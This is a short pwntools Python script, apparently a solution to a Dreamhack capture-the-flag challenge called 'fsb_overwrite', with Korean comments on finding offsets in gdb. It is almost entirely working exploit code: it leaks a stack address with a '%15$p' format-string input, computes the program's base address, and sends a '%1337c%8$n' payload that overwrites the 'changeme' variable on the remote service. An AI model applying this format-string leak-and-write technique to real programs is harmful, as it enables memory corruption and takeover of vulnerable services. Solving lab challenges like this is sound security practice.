#! /usr/bin/python3

from pwn import *

def slog(name, addr):
    return success(" : ".join([name, hex(addr)]))

p = remote("host1.dreamhack.games", 12431)
e = ELF("./fsb_overwrite")


# gdb 통해서 파악한 이후 해당 코드 작성할 것
# 1. 메인 안의 Printf 함수 호출하는 줄에 breakpoint를 건다
# 2. x/30xg $rsp 를 통해 code section 안을 참조하는 부분이 어디인지 파악
# vmmap을 통해서 확인가능 0x555555....으로 시작할 것
# 찾은 주소와 start 주소를 뺀다 -> libc base
p.sendline(b"%15$p") # $rsp + 0x58에 위치해 있다 -> get the address of the 17th offset 
                     # 원격서버에서는 + 0x48에 위치..?
leaked = int(p.recvline()[:-1], 16)
code_base = leaked - 0x1293
changeme = code_base + e.sym['changeme']

payload = b"%1337c" + b"%8$n" + b'A'*6 + p64(changeme)
p.sendline(payload)
p.interactive()
